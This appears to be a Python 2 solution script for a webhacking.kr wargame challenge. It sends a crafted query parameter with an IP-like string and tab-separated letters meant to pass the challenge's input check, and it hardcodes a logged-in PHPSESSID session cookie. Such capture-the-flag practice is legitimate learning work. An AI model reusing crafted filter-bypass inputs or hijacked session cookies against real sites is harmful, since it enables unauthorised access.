#-*- coding: utf-8 -*-
import urllib2
import CookieManager
import urllib

challengeUrl = "http://webhacking.kr/challenge/codeing/code2.html"
param = urllib.quote("1abcde_.A163.152.126.173.A\tp\ta\ts\ts")

httpRequest = urllib2.Request(challengeUrl + "?val=" + param)
CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpResponse = urllib2.urlopen(httpRequest).read()
print httpResponse
